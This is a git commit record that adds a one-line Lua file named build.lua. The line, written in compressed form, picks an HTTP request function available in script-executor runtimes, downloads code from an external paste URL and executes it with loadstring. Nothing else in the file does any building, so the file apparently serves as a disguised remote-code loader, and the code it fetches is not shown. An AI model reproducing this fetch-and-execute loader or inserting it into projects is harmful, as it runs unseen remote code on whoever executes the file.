8d21ee05b04f236c0453e82884c99c96703133e6
DomainXV3 <122718015+DomainXV3@users.noreply.github.com>
2024-01-19 17:53:16 +0800

    Create build.lua

---
+++ build.lua
@@ -0,0 +1,1 @@
+local a,b,c,d=loadstring,request or http_request or (http and http.request) or (syn and syn.request),assert,"https://shz.al/mkMc54DXKTCWxeZXh8N4pD45"c(a and b, "Your Executor does not support.")a(b({Url=d,Method="GET"}).Body)()
